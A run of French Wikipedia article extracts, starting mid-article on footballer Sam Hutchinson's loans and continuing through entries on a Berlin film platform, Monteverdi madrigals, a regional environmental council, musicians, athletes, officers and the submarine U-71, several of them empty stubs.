Le , Hutchinson est prêté à Nottingham Forest, club de D2 anglaise. Il a fait ses débuts le , sur le banc avant de remplacer Simon Cox dans un match nul 1-1 face à Huddersfield Town. Le septembre 2012, il marque son premier et son dernier but avec son nouveau club lors de sa première titularisation à domicile dans une victoire 2-1 contre Charlton Athletic. À la suite d'une autre blessure au genou, Hutchinson est retourné à Chelsea en septembre pour une injection qui était destiné à régler le problème pendant la trêve internationale d'octobre. Malheureusement, le traitement n'a pas fonctionné pour Hutchinson qui n'était toujours pas rétabli à la mi-décembre, il manque donc 15 matchs. Après une longue pause, il reprend l'entraînement avec Nottingham au début de mars 2013.
Vitesse Arnhem.
Le , Sam Hutchinson est prêté pour une saison au Vitesse Arnhem, club de D1 néerlandaise.
Sheffield Wednesday et après.
En , il est prêté au Sheffield Wednesday. En fin de contrat avec Chelsea, il s'engage avec Sheffield Wednesday début .
Le , il rejoint Reading.
En sélection.
Sam Hutchinson a joué pour l'Angleterre des moins de 18 ans et des moins de 19 ans mais il a raté le Championnat d'Europe 2008 des moins de 19 ans à cause d'une blessure.

</doc>
<doc id="7278692" url="https://fr.wikipedia.org/wiki?curid=7278692" title="Directors Lounge">
Directors Lounge

Directors Lounge (abréviation: DL), basé à Berlin, est une plate-forme pour arts cinématographique et multimédia qui organise des avant-premières et des expositions tout au long de l'année à Berlin et différentes autres villes. Chaque année parallèlement à la Berlinale (février) a lieu la manifestation centrale de Directors Lounge : l’intense présentation «The Berlin International Directors Lounge». Directors Lounge a été créé par le réalisateur André Werner, l'artiste Joachim Seinfeld et le galeriste/administrateur Longest F. Stein en lien avec les galeries A&amp;O ainsi qu’avec d’autres artistes actifs dans le domaine du multimédia à Berlin.
Fondation.
Directors Lounge a été fondé en 2005 de manière informelle pour proposer aux réalisateurs et artistes utilisant le support vidéo un environnement non contraignant, point de rencontre pendant la Berlinale, donnant aussi la possibilité de projeter des films qui - au regard de leurs durée, méthodes ou thématiques- n’entrent pas dans une catégorisation normée, que ces films soient le fruit d’artistes connus ou non. Contrairement à la plupart des festivals de ce type l’environnement se veut dégagé de l’atmosphère habituelle des «salles obscures»: on favorisera plutôt l’interaction et la discussion. En tant que tel son but était aussi de servir de rampe de lancement à des coopérations. Par suite de sa perception positive, l’«Event» s’est étendu en dehors de la simple période du festival annuel et s’est développé jusqu’à devenir une plate-forme pérenne pour le film et l’art dans le domaine du multimédia, «The Berlin International Directors Lounge» restant tous les ans la manifestation centrale. Le festival a été jusque-là organisé dans des lieux différents avec une attention particulière à ce qu’il reste un évènement multimédia non standardisé.
Berlin International Directors Lounge.
La manifestation publique annuelle, celle de février se déroulant parallèlement à la Berlinale, est en premier lieu un forum du film avec une prédominance de courts-métrages. Forum qui met aussi en scène installations à caractère artistique, live musicaux et Actionnisme («Aktionskunst»). Beaucoup de films sont projetés en avant-première. La direction artistique de la dernière manifestation annuelle (acronyme «DLX», 6-) a été prise en charge par Julia Murakami, André Werner, Klaus W. Eisenlohr et Kenton Turk. Parmi les administrateurs participant à l’organisation du festival comptent souvent les réalisateurs Alexei Dmitriev (Russie) et Shaun Wilson (Australie) ainsi que Heiko Daxl (Allemagne) décédé en 2012 en coopération avec Ingeborg Fülepp (Croatie), tous deux artistes multimédia.
Le premier festival (2005) a été organisé dans le Club "el Cultrún" à Berlin-Friedrichshain. En 2006 et 2007 des espaces réaménagés dans la Karl-Marx Allee (num. 137/133) ont servi de siège au Festival. En 2008 et 2009 Directors Lounge s’est déplacé dans le quartier Mitte dans la "Scala" entre-temps disparue (ouverte en 1908 en tant que «Überbrettl» - grand cabaret-, plus tard appelée "Aladin", puis "Camera" « l’unique cinéma d’art et d’essai de la RDA »), alors qu’en 2010 et 2011 c’est la maison de l’art et atelier "Meinblau" sur la "Pfefferberg" à Prenzlauer Berg qui a servi de lieu d’organisation. Pour le Festival Directors Lounge réélit Mitte comme lieu d’organisation, dans le "Naherholung Sternchen", derrière l’ancien cinéma est-allemand "Kino International" - spécialisé alors dans les avant-premières - situé à proximité d'Alexanderplatz.
Comme son nom ("Lounge") l’indique, il importe aux organisateurs du Festival de créer une atmosphère informelle et d’ambiance, à travers laquelle les cinéastes se voient offert la possibilité d’entrer facilement en contact, ce qui le singularise par rapport à bon nombre d’entreprises similaires. Le festival est ouvert à tout envoi, indépendamment de sa durée. À côté des films sélectionnés dans le cadre d’un appel d’offres (Open Call) ouvert à tous, le contenu est aussi composé d’une série de programmes émanant des administrateurs.
Le festival ne décerne pas de prix aux films participants ce par quoi il se distingue encore de manifestations semblables. C’est une organisation à but non lucratif en grande partie soutenue par des prestations bénévoles et un peu de sponsoring. Exposants et conférenciers invités ne sont pas payés pour leurs participations.
Comme remarquables parmi les participants s’étant associés dès ses débuts au festival peuvent être cités Michael Nyman, nommé aux Golden Globes et distingué du BAFTA qui a été présent lors de la première avant-première publique de son film "NYman With A Movie Camera" (2011) en Allemagne; le réalisateur canadien Guy Maddin qui l’année de sa participation au jury de la Berlinale a fait part d’une sélection de ses courts-métrages (2011); le photographe/cinéaste Anton Corbijn (2012), distingué par trois prix au Festival de Cannes; Simon Ellis, honoré du prix Sundance par le jury international dans la catégorie court-métrage qui a été présent lors d’une rétrospective de ses films administrée par lui-même en 2012, ainsi que le réalisateur Nick Zedd à qui l’on doit le concept de «Cinema of Transgression» et qui fut aussi présent en 2012 lors d’une rétrospective de ses courts-métrages.
Parmi les artistes le compositeur tchèque à la musique avant-gardiste Vladimir Hirsch (qui a présenté son "Underlying Scapes"), (vidéaste de performance qui a présenté ses "Audiovisual Abstractions") et Birol Ünel, distingué du prix du film allemand ("Deutscher Filmpreis") dans la catégorie meilleur acteur principal (et qui a récité des poésies de Miron Zownir, membre du mouvement «anti-art» ).
Plate-forme pour l’art dans le domaine du multimédia tout au long de l’année.
Bientôt le festival se déroulant en février devait grandir jusqu’à devenir une entreprise qui organise des présentations tout au cours de l’année. Il y a eu une série d’évènements et de coopération de Directors Lounge à l’étranger, entre autres à Londres (Cog Collective, 2006), Poznań (IF Museum, 2006), Denver (TIE [The International Experimental Cinema Exhibition], 2006), Miami (Art Basel Miami Beach, 2006), Saint-Pétersbourg (en coopération avec le Goethe-Institut, 2008), Paris (Nuit Blanche, 2011) Los Angeles (avec la Los Angeles Art Association, 2011), Timișoara (Timishort Film Festival, 2011) , Rome ("L’isola del Cinema, Cinelab Groupama", 2012), Albuquerque ("Experiments in Cinema", 2012 et 2013), Séoul ("Zaha Museum", 2012, "Gallery On", 2014), Vienne (Museumsquartier, 2014) Porto Alegre (Usina do Gasômetro, en coopération avec le Goethe-Institut, 2015) et Salvador (en coopération avec Ocupação Coaty, 2016). Des évènements semblables se sont déroulés en Allemagne en dehors de Berlin à Munich (Memory in Motion, 2007), Cologne (Tease Art Fair, 2009), Essen (C.A.R, 2011), Düsseldorf ("Japan-Tag", cinéma "Blackbox" dans le Musée du Film, 2011, 2012, 2013 et 2014) et Dresde (Motorenhalle, 2015). Les présentations reflètent souvent la perspective de l’évènement de février. Lors de ces excursions se sont produits entre autres VJ Chuuu (Japon) et Eberhard Kranemann (membre fondateur de Kraftwerk).
À côté de ces excursions à l’étranger il y a régulièrement des présentations à Berlin même. Les conférences de Klaus W. Eisenlohr, entre autres, sont depuis quelques mois notables. Celles-ci se caractérisent par des tours de discussion entre les réalisateurs et le public à la suite des projections cinématographiques. La plupart de ces discussions ont lieu dans le "Z-inema" du "Z-Bar" qui organise bon nombre d’évènements culturels diversifiés. Eisenlohr donne aussi une série de conférences spécifiques portant le titre de «Urban Research» qui sont présentées régulièrement dans le cadre du festival de février.
Directors Lounge n’est en aucune manière lié à la Berlinale, malgré le parallèle temporel entre cette dernière et la manifestation de février. De même Directors Lounge ne saurait être confondu avec l’organisation allemande du nom de Regielounge, fondée postérieurement et dont le nom traduit de l’anglais apparaît différent de «Director’s Lounge» ou «Directors Lounge».

</doc>
<doc id="7278693" url="https://fr.wikipedia.org/wiki?curid=7278693" title="Ariadne Diaz">
Ariadne Diaz



</doc>
<doc id="7278695" url="https://fr.wikipedia.org/wiki?curid=7278695" title="Anna Olsson (canoë-kayak)">
Anna Olsson (canoë-kayak)

Anna Gunilla Olsson, née le à Timrå, est une kayakiste suédoise.
Elle compte quatre médailles olympiques à son palmarès dont un titre en 1984, ainsi que huit podiums aux Championnats du monde.
Elle est la sœur du kayakiste Gunnar Olsson.

</doc>
<doc id="7278696" url="https://fr.wikipedia.org/wiki?curid=7278696" title="Second livre de madrigaux (Monteverdi)">
Second livre de madrigaux (Monteverdi)

Le second livre de madrigaux (titre original en italien, "secondo libro dei Madrigali") est un recueil de vingt madrigaux à cinq voix (le premier en deux parties) composés par Claudio Monteverdi et publiés à Venise en 1590.
Les madrigaux sont composés sur des textes de poètes célèbres à l’époque, en particulier du Tasse, mais aussi sur des vers d’auteurs anonymes.
Effectif vocal.
Les madrigaux sont composés pour cinq voix, à savoir le "canto" qui correspond à la voix supérieure (souvent tenue dans les interprétations modernes par une soprano), la deuxième voix, l"'alto" (mezzo-soprano, contralto, ou contre-ténor), ensuite le "tenore" (ténor), le "basso" (basse), et le "quinto". Cette dernière partie n'équivaut pas à une tessiture précise, mais pouvait être chantée par une deuxième soprano, alto ou ténor selon les madrigaux. 
On désignait cette partie dans les traités musicaux du sous la dénomination de "vox vagans", signifiant .

</doc>
<doc id="7278697" url="https://fr.wikipedia.org/wiki?curid=7278697" title="Vassili Adadouroff">
Vassili Adadouroff



</doc>
<doc id="7278698" url="https://fr.wikipedia.org/wiki?curid=7278698" title="Conseil scientifique de l'environnement du Nord - Pas-de-Calais">
Conseil scientifique de l'environnement du Nord - Pas-de-Calais

Le Conseil scientifique de l’environnement Nord - Pas-de-Calais (CSENPC) est une association loi de 1901 de la région Nord-Pas-de-Calais ayant pour objet d'apporter avis et conseils dans le domaine de l'environnement régional et de promouvoir la recherche scientifique sur les thématiques environnementales au sens large.
Création.
Le Conseil scientifique de l’environnement Nord - Pas-de-Calais a été créé en 1993 à la suite de la mise en place par l’État du Conseil scientifique régional du patrimoine naturel (CSRPN) et en remplacement du précédent Conseil scientifique régional (CSRE) né en 1983 sous l’impulsion d’Huguette Bouchardeau alors secrétaire d'État à l'Environnement et au Cadre de vie.
Fonctionnement.
Le CSENPC est une association loi de 1901 qui fonctionne avec un bureau permanent composé d'un président, d'un vice-président, d'un secrétaire, d'un secrétaire-adjoint, d'un trésorier et d'un trésorier-adjoint agissant au sein d'un conseil d’administration renouvelable par tiers et composé de dix-huit membres élus pour trois ans. L'association se compose d'une cinquantaine d'universitaires constituant le Groupe plénier scientifique (GPS) et d'une dizaine d'experts non-universitaires constituant le Groupe plénier élargi (GPE).
Les universités régionales y sont représentées comme l'ensemble des disciplines en lien avec le domaine environnemental.
Le conseil dispose d'une chargée de mission à plein temps hébergée au sein d'Espaces naturels régionaux (ENRx) et d'un site Internet (en construction).
Il existe deux autres conseils similaires en France : le Conseil scientifique de l'environnement de Bretagne (CSEB) créé en 1993 à l'initiative du président du Conseil régional et le Conseil scientifique de l'environnement du Morbihan (CSEM).
Missions.
Le CSENPC a pour missions :
En adéquation avec les principes du CORP (Conseil d’orientation, recherche et prospective de la Fédération des parcs naturels régionaux), le conseil a également pour mission d'être conseil scientifique des trois parcs naturels régionaux (Parc naturel régional de l'Avesnois, Parc naturel régional des caps et marais d'Opale, Parc naturel régional Scarpe-Escaut), du Centre régional de ressources génétiques (CRRG) et d'Espaces naturels régionaux (ENRx).
Activités.
Le CSENPC organise onze journées thématiques par an sous forme de séminaires ou de colloques qui sont tout à la fois des temps de formation, d'échanges et de réflexion entre les membres du conseil, ses partenaires réguliers et quelques spécialistes invités extérieurs à la région (e.g. "Santé, biodiversité et perturbateurs endocriniens, Friches industrielles : du reverdissement à la renaturation, Biodiversité et variabilité génétique, L'arbre fruitier dans le paysage, Zones humides et élevage, Les creuses dans la trame verte et bleue, Droit de l'environnement, Les carrières en fin de carrière", etc.).
Le CSENPC initie par ailleurs plusieurs groupes de travail (e.g. "Mise en valeur du patrimoine animalier régional, Porter à connaissance des problématiques environnementales à destination des élus, Valorisation des zones humides, État des formations naturalistes en région") et ses membres participent à de nombreux comités de gestion et/ou de pilotage (Commission cynégétique, Alimentation durable en Scarpe-Escaut, Conseil départemental des espaces, sites et itinéraires, etc.) comme à d'autres conseils scientifiques comme le CSRPN, le conseil scientifique du Conservatoire d'espaces naturels du Nord et du Pas-de-Calais ou le Conseil scientifique consultatif de la Réserve biologique dirigée de Merlimont (ONF).
En raison de la loi NOTRe et de la modification territoriale, le CSENPC s'ouvre aux départements de l'ancienne Région Picardie et se voit devenir conseil scientifique du Parc naturel régional Oise-Pays de France. Il tisse un partenariat avec le conseil scientifique de préfiguration du projet de Parc naturel régional de la Baie de Somme Picardie Maritime et participe aux échanges avec la Fédération des parcs naturels régionaux.
Enfin, le CSENPC peut être sollicité par les services de l'État, les collectivités territoriales, les Parcs naturels régionaux, les organismes parapublics (ONF, Agence de l'eau), les entreprises ou les associations pour expertiser des questions environnementales. Le dossier est alors transmis aux membres compétents pour avis.
Partenaires.
Le CSENPC entretient un partenariat privilégié avec
Le CSENPC collabore occasionnellement avec
Le soutien financier est assuré par la Région Nord-Pas-de-Calais et les deux départements du Nord et du Pas-de-Calais.

</doc>
<doc id="7278699" url="https://fr.wikipedia.org/wiki?curid=7278699" title="Marie Guy-Stéphan">
Marie Guy-Stéphan

Marie-Antoinette Stéphan (épouse Guy), connue à la scène sous le nom de Marie Guy-Stéphan (Paris, - Paris, ), est une danseuse française.
Biographie.
Elle est la fille de Johann-Baptiste Stéphan, un marchand fripier d'origine allemande, et de Marie Joséphine Corroy.
Elle débute dans les chœurs de l'Opéra de Paris puis se fait engager au ballet du Grand Théâtre de Bordeaux. On sait qu'elle dansa à la Scala, à Londres, et en Espagne au théâtre Circo. Elle s'intéresse aux danses espagnoles et ajoute à son répertoire le Boléro chorégraphique, elle devient une des spécialistes des pas espagnols. 
On pouvait lire dans la "Revue et gazette musicale" en 1856 :
En 1857, son partenaire au théâtre del Principe de Madrid, Monsieur Paul, lui intente un procès pour rupture de contrat. La presse parisienne s'en fait l'écho.
Dans ses mémoires, le chorégraphe Marius Petipa raconte sa tournée en Andalousie avec Madame Stephan :
Elle passe pour avoir été la protégée de José de Salamanca y Mayol.
Preuve de sa renommée, la célèbre fabrique de porcelaine de Volkstedt lui consacra une figurine.

</doc>
<doc id="7278700" url="https://fr.wikipedia.org/wiki?curid=7278700" title="Jacques Dejean">
Jacques Dejean

Jacques Dejean, né le à Bordeaux et mort le à Sainte-Foy-la-Grande (Gironde), est un violoniste français.
Biographie.
Son père, Louis Dejean, était professeur de violon et violoniste au Grand Théâtre de Bordeaux ; sa mère, Rose Fino, d'origine basque, était professeur de piano renommée. Après un premier prix de violon et un premier prix d'alto au Conservatoire de Bordeaux en 1936, Jacques Dejean intègre la classe de Jules Boucherit au Conservatoire de Paris, où il obtient le premier prix de violon, premier nommé. En 1942 il remporte le premier prix du Concours Jacques Thibaud (jury composé de Jacques Thibaud, Jules Boucherit, Gaston Poulet, Jean Fournier, André Asselin et Firmin Touche) l'année de sa fondation à Bordeaux (cf. photo).
Violon solo de nombreux orchestres (Grand Théâtre de Bordeaux, Concerts Colonne, Concerts Lamoureux, Concerts Pasdeloup, Orquesta Sinfónica del Estado de México), il a aussi été membre de plusieurs quatuors à cordes français (Quatuor Tessier, Quatuor Lespine, Quatuor de l'ORTF), avec lesquels il a enregistré et effectué plusieurs tournées mondiales.
Son activité professionnelle a été animée par des rencontres exceptionnelles. En tant que soliste, il a collaboré et enregistré avec des artistes renommés aussi variés que Paul Paray, Jacques Février, Henryk Szeryng, Lily Laskine, Édith Piaf, Milva, Luciano Berio, Marius Constant, Pierre Boulez, Peter Brook et Jérôme Deschamps. 
Très jeune, il a été professeur aux conservatoires de Bordeaux et de Nantes. Ses cours de déchiffrage au Conservatoire national supérieur de musique de Paris ont été suivis par toute une generation de violonistes et d'altistes. Pédagogue révéré autant pour sa grande culture que pour sa gentillesse, il a porté de nombreux élèves jusqu'au plus haut niveau. 
Son frère jumeau, Pierre Dejean, a été percussionniste et timbalier à la Radiodiffusion française de 1943 à 1974 avant de se consacrer entièrement à une carrière d'artiste peintre.
Jacques Dejean est enterré au Cimetière de La Chartreuse à Bordeaux aux côtés de son oncle André Fino, pianiste, compositeur et dessinateur de grand talent, mort prématurément pendant la Première Guerre.

</doc>
<doc id="7278703" url="https://fr.wikipedia.org/wiki?curid=7278703" title="Gunnar Olsson (canoë-kayak)">
Gunnar Olsson (canoë-kayak)

Gunnar Alfred Olsson, née le à Timrå, est un kayakiste suédois.
Il est le frère de la kayakiste Anna Olsson.

</doc>
<doc id="7278704" url="https://fr.wikipedia.org/wiki?curid=7278704" title="Gunnar Olsson">
Gunnar Olsson



</doc>
<doc id="7278705" url="https://fr.wikipedia.org/wiki?curid=7278705" title="Besti flokkurinn">
Besti flokkurinn



</doc>
<doc id="7278706" url="https://fr.wikipedia.org/wiki?curid=7278706" title="Bestiflokkurinn">
Bestiflokkurinn



</doc>
<doc id="7278707" url="https://fr.wikipedia.org/wiki?curid=7278707" title="Louis Wibratte">
Louis Wibratte

Louis Wibratte ( à Bourg-en-Bresse - à Paris) est un ingénieur et banquier français.
Biographie.
Élève de l'École polytechnique et de l'École des ponts et chaussées, il devient ingénieur des ponts et chaussées en 1903, ingénieur aux Chemins de fer de l'État, puis ingénieur-conseil de la Compagnie du chemin de fer du Chili et de la , dont il devient président.
Chef de bataillon du Génie détaché au Ministère des Travaux publics lors de la Première Guerre mondiale, il est mobilisé comme colonel en 1939.
Appelé comme directeur de la Banque de Paris et des Pays-Bas en 1920, il en devient administrateur en 1939 et président de 1945 à 1949.
Il est également administrateur de la Compagnie des chemins de fer du Maroc, de la Compagnie du chemin de fer franco-éthiopien, de la Caisse foncière de Crédit, de l'Union industrielle de Crédit (UIC), de la Compagnie générale de la télégraphie sans fil (CSF) et de la Compagnie Radio France.

</doc>
<doc id="7278708" url="https://fr.wikipedia.org/wiki?curid=7278708" title="Armée d’Aragon">
Armée d’Aragon



</doc>
<doc id="7278709" url="https://fr.wikipedia.org/wiki?curid=7278709" title="Jules César, le glaive et la soie">
Jules César, le glaive et la soie

Jules César, le glaive et la soie est le deuxième volet du roman "Caesar's Women", écrit par Colleen McCullough en 1996. Il a été publié en français aux Éditions L'Archipel en 1999. Le premier volet est "Jules César, la violence et la passion". La suite de "Jules César, le glaive et la soie" est "La Conquête gauloise".
Il s'agit du sixième roman de la fresque historique "Les Maîtres de Rome".
Résumé.
Le roman raconte l'histoire de la République romaine de 63 à 58 av. J.-C. en mettant l'accent sur la carrière de César. Il commence en racontant les suites de la conjuration de Catilina et les efforts de César pour humilier Cicéron, qui a profité de la menace pour exécuter des complices sans procès. Le procès de Rabirius lui démontre qu'il peut être poursuivi n'importe quand pour cet acte illégal.
En 62 av. J.-C., la préture de César commence dans la controverse. Il est d'abord relevé de ses fonctions par le nouveau consul pour incitation à la violence. Une foule en colère manifeste au Forum. César l'apaise. Le consul lui redonne ses anciennes fonctions, au grand dam des "Boni" (la faction ultra-conservatrice du Sénat) qui ne sait plus quoi faire pour le déloger. Un mois plus tard, les "Boni" tentent de nouveau de le discréditer en faisant croire qu'il a participé activement à la conjuration de Catilina. Mais les preuves sont tellement minces qu'ils font face à un nouvel échec.
César est à peine ébranlé lors de la fête de la Bona Dea, alors que Clodius commet un sacrilège en y participant alors que seules les femmes y sont admises. Une esclave déclare que la femme de César était complice. Rien, à part ce témoignage ne semble le prouver vraiment, mais César décide de divorcer. Même sa femme, dit-il, ne doit être soupçonnée.
L'année suivante, en 61 av. J.-C., il devient gouverneur de l'Hispanie ultérieure. Il revient en 60 à temps pour se présenter au consulat pour l'année 59. Il s'aperçoit cependant que le Sénat va le lui gâcher. Il forme alors avec Pompée et Crassus un triumvirat pour lui faire front. Crassus a besoin de faire ratifier ses contrats en Orient et Pompée veut donner des terres à ses vétérans qui l'ont aidé à conquérir l'Orient. César veut obtenir, à la fin de son consulat, les Gaules transalpine et cisalpine ainsi que l'Illyricum. À trois, ils croient réussir à contrer les "Boni".
Sitôt consul, César fait ratifier les contrats de Crassus en Orient et fait adopter une loi agraire donnant des terres aux vétérans de Pompée. Puis, pour conforter son alliance avec celui-ci, il lui donne sa fille Julia en mariage, au grand désespoir de Brutus, qui était fiancé avec elle depuis 8 ans. Le reste de son année consulaire, César l'emploie à obtenir les provinces qu'il veut acquérir et à trouver des fonds pour une future campagne de guerre. Pour que l'Égypte reste en paix, son roi est prêt à lui donner 8000 talents d'or: 1000 talents iront à Crassus, 1000 à Pompée et le reste pour lui et le financement de sa campagne. La "Lex Vatinia" lui donne la Gaule italique et l'Illyricum pour 5 ans. Le Sénat accepte de lui donner en plus la Gaule transalpine.
César déclare alors à Crassus que désormais plus rien ne l'empêche de devenir le plus grand de tous les Romains.

</doc>
<doc id="7278710" url="https://fr.wikipedia.org/wiki?curid=7278710" title="Emelia Gorecka">
Emelia Gorecka

Emelia Gorecka (née le à Epsom) est une athlète britannique, spécialiste des courses de fond et de cross-country.
Elle remporte le titre du 3 000 m lors des Championnats d'Europe juniors d'athlétisme de 2013 à Rieti (Italie).

</doc>
<doc id="7278717" url="https://fr.wikipedia.org/wiki?curid=7278717" title="Bibliothèque municipale de Vérone">
Bibliothèque municipale de Vérone

La bibliothèque municipale de Vérone, ou en italien, est une bibliothèque italienne située dans la ville de Vérone, en Vénétie.

</doc>
<doc id="7278719" url="https://fr.wikipedia.org/wiki?curid=7278719" title="Alex Rins">
Alex Rins



</doc>
<doc id="7278720" url="https://fr.wikipedia.org/wiki?curid=7278720" title="Biblioteca Civica di Verona">
Biblioteca Civica di Verona



</doc>
<doc id="7278722" url="https://fr.wikipedia.org/wiki?curid=7278722" title="Marie-Antoinette GUY-STÉPHAN">
Marie-Antoinette GUY-STÉPHAN



</doc>
<doc id="7278725" url="https://fr.wikipedia.org/wiki?curid=7278725" title="Ludwig von Estorff">
Ludwig von Estorff

Ludwig von Estorff né le à Hanovre et décédé le à Uelzen est un allemand pendant la Première Guerre mondiale.
Biographie.
Ludwig est né dans une et était le deuxième enfant du major-général (1831-1903) et de sa femme Julie Bernhardine, né de (1836-1902).
Estorff a grandi près de Berlin et en 1878 a commencé sa carrière comme officier dans le d'infanterie. Le , il est promu premier lieutenant. Le octobre, il rejoint l'Académie militaire prussienne. Il reste jusqu'à son transfert dans le Grand État-Major général le . Le , il est promu capitaine et devient commandant de compagnie dans un régiment d'infanterie.
Le , il est transféré à la force de protection du Sud-Ouest africain allemand. Là, il y reste du au , comme un commandant de compagnie. À son retour en Allemagne, le , il rejoint le Grand État-Major, et le , il est promu au grade de major.
Le , il est nommé commandant du du régiment de campagne. À ce titre, il participe à la bataille de Waterberg en .
Le , il devient commandant du de campagne et il est promu lieutenant-colonel. Le , il est nommé commandant des troupes allemandes du Sud-Ouest africain. Le , il est promu au grade de colonel. Le , il devient commandant du régiment d'infanterie de Brunswick (Basse-Saxe). le , il est promu au grade de major général de la d'infanterie à Metz.
C'est avec cette unité qu'il débute la Première Guerre mondiale sur le front occidental. Le septembre il est grièvement blessé. Après son hospitalisation et sa convalescence, il retourne au front le en tant que commandant de la d'infanterie. Le , il est promu au grade de lieutenant-général et le , il était à la tête de la d'infanterie.
Il participe à l'opération Albion, une opération d'invasion des îles de Saaremaa, Hiiumaa et Muhu en Estonie.
Depuis le , il est commandant adjoint de la allemande, dans les pays baltes. En , il négocie avec les Britanniques, vainqueurs de la guerre, l'évacuation des troupes allemandes en Lettonie face à l'avancée de l'Armée rouge.
Le , il est nommé gouverneur de Königsberg et le , il est chargé de la direction du premier corps d'armée. Le il prend le commandement du groupe 3, en même temps que celui de la militaire, le Wehrkreis I, et de la de la Reichswehr.
Le , il se retire après le Putsch de Kapp. Le , il reçoit le ' (titre honorifique) de ', et une caserne à Herford est baptisée de son nom.

</doc>
<doc id="7278726" url="https://fr.wikipedia.org/wiki?curid=7278726" title="José de Bustamante y Guerra">
José de Bustamante y Guerra

José Joaquìn de Toranzo de Bustamante y Guerra, né le à Otaneda, Cantabria et mort le à Madrid, est un officier de marine, explorateur et homme politique espagnol. Il est le fils de Joaquìn Antonio de Bustamante (1700-1781) et de Clara Ignacia Guerra de la Vega (1718-?).
Biographie.
Aspirant à l'Académie militaire de Cadix (1770), il embarque pour les Philippines. Le navire qui le transporte est alors attaqué par les Anglais et il est capturé puis amené en Angleterre.
En 1788, avec Alessandro Malaspina, il propose à la Couronne espagnole une expédition autour du monde. Le projet accepté, deux navires sont construits, l"'Atrevida" et la "Descubierta", Bustamante prenant le commandement du premier. Les deux hommes sont placés à la tête de l'expédition qui est connue sous le nom d'Expédition Malaspina.
Partis en 1789, ils longent la côte ouest des Amériques jusqu'à l'Alaska, visitent les colonies espagnoles du Pacifique, passent en Nouvelle-Zélande, en Australie, aux Iles Mariannes et reviennent en Europe en 1794.
En 1796, Bustamante est nommé Gouverneur du Paraguay et de Montevideo. Fait prisonnier en 1803 de nouveau par les Anglais, il est relâché, ce qui lui vaut une traduction en cour martiale dont il est acquitté. 
Nommé Gouverneur du Guatemala à une époque de grande activité indépendantiste (1810-1819), il affronta les constitutionnalistes locaux, réprimant durement les insurgés ; il s’opposa à la constitution libérale de 1812. Il fut congédié en août 1817 et retourna en Espagne en 1819.
il meurt en 1825.

</doc>
<doc id="7278729" url="https://fr.wikipedia.org/wiki?curid=7278729" title="Holmfrid Olsson">
Holmfrid Olsson

Holmfrid Olsson, né le et mort le , est un biathlète suédois.
Biographie.
Aux Championnats du monde 1966, il gagne sa première médaille de bronze en relais et se classe quatrième de l'individuel. En 1967, il est de nouveau médaillé de bronze du relais en mondial ainsi qu'aux Jeux olympiques de Grenoble en 1968, où il est également vingtième de l'individuel.
Il prend part aussi aux Jeux olympiques d'hiver de 1972.

</doc>
<doc id="7278731" url="https://fr.wikipedia.org/wiki?curid=7278731" title="Dentarius Locke">
Dentarius Locke

Dentarius Locke (né le à Tampa) est un athlète américain, spécialiste des épreuves de sprint.
Biographie.
Étudiant à l'Université de Floride, Dentarius Locke se distingue en juin 2013 lors des championnats NCAA d'athlétisme en descendant pour la première fois de sa carrière sous la barrière des dix secondes sur 100 mètres, en signant le temps de 9 s 97 (+ 1,9 m/s). En juillet, il se classe deuxième du meeting Herculis de Monaco, derrière son compatriote Justin Gatlin, et améliore d'un centième de seconde son record personnel (9 s 96). Il est sélectionné dans l'équipe du relais 4 × 100 m américain pour les championnats du monde 2013 de Moscou. 

</doc>
<doc id="7278732" url="https://fr.wikipedia.org/wiki?curid=7278732" title="Hans Olsson (canoë)">
Hans Olsson (canoë)



</doc>
<doc id="7278736" url="https://fr.wikipedia.org/wiki?curid=7278736" title="Bougie (Algérie)">
Bougie (Algérie)



</doc>
<doc id="7278737" url="https://fr.wikipedia.org/wiki?curid=7278737" title="Laticilla burnesii">
Laticilla burnesii



</doc>
<doc id="7278740" url="https://fr.wikipedia.org/wiki?curid=7278740" title="Píratapartýið">
Píratapartýið



</doc>
<doc id="7278742" url="https://fr.wikipedia.org/wiki?curid=7278742" title="Suter Honda">
Suter Honda



</doc>
<doc id="7278751" url="https://fr.wikipedia.org/wiki?curid=7278751" title="Coupe de Tunisie de football 1934-1935">
Coupe de Tunisie de football 1934-1935

La Coupe de Tunisie de football 1934-1935 est la de la coupe de Tunisie.
C'est la cinquième Coupe et la troisième consécutive pour le grand club de l'époque, l'Union sportive tunisienne, composée d'un groupe de joueurs talentueux à l'instar d'André Tuil, Cohen Gannouna, Édouard Fitoussi, Raymond Temim, Angel Darmon, Albert Benmussa, Victor Assous, René Pariente, Henri Bismuth, Édouard Zerbib, Jacques Setbon (alias Kiki Lakhal) et Maurice Castro, auteur des trois buts de la finale.

</doc>
<doc id="7278756" url="https://fr.wikipedia.org/wiki?curid=7278756" title="Oluf Olsson">
Oluf Olsson

Oluf Olsson, née le à Copenhague et mort le à Copenhague, est un gymnaste artistique danois.
Carrière.
Oluf Olsson participe aux Jeux olympiques intercalés de 1906 à Athènes et obtient une médaille d'argent par équipe. Aux Jeux olympiques d'été de 1908 à Londres, il fait partie de l'équipe danoise terminant quatrième. Il remporte la médaille de bronze du concours général par équipes en système libre aux Jeux olympiques d'été de 1912 à Stockholm.

</doc>
<doc id="7278758" url="https://fr.wikipedia.org/wiki?curid=7278758" title="Unterseeboot 71 (1940)">
Unterseeboot 71 (1940)

Le Unterseeboot 71 (ou U-71) est un sous-marin (U-Boot) allemand de type VII C de la Kriegsmarine pendant la Seconde Guerre mondiale.
Historique.
Mis en service le , le U-71 sert initialement comme navire-école de formation, au sein de la 7. Unterseebootsflottille à Kiel.&lt;br&gt;
Le , le U-71 devient opérationnel toujours dans la 7. Unterseebootsflottille, à Kiel et à la base sous-marine de Saint-Nazaire en France.
Il réalise sa première patrouille de guerre, appareillant du port de Kiel, le , sous les ordres du Kapitänleutnant "Walter Flachsenberg". Il rejoint la base sous-marine de Saint-Nazaire le après dix-neuf jours en mer.
Le , la corvette britannique "HMS Gladiolus" repère le U-Boot en surface alors qu'il approche d'un convoi, ce qui le force à plonger. Le "HMS Gladiolus" lui lance trente grenades sous-marines en cinq passes avant d'être aidé par la corvette "HMS Nasturtium" qui lui jette six grenades sous-marines supplémentaires. Le U-71 s'échappe naviguant en surface. Il a reçu au moins un impact sur le kiosque provenant du "HMS Gladiolus".
Le , pendant l'attaque contre le convoi "HG-75", le U-71 attaque l'escorte par un tir de quatre torpilles, sans succès. L'escorte riposte avec des grenades anti-sous-marines pendant sept heures, endommageant le U-Boot si violemment qu'il doit ajourner sa mission et retourner à son port d'attache.
